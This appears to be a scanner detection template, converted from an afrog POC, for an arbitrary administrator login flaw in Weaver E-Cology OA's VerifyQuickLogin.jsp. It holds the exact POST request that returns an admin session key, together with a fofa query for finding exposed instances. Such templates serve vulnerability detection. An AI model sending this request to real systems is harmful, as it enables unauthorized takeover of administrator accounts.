# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: identifier=1&language=1&ipaddress=x.x.x.x
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"sessionkey":'
          - '"message":'
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/mobile/plugin/VerifyQuickLogin.jsp'
id: ecology-verifyquicklogin-login-bypass
info:
  author: zan8in
  description: |-
    泛微OA E-Cology VerifyQuickLogin.jsp文件中存在任意管理员登录漏洞，攻击着通过发送特殊的请求包可以获取管理员Session
    fofa: app="泛微-协同办公OA"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞
  severity: high
  tags: weaver,ecology,bypass,argus-import
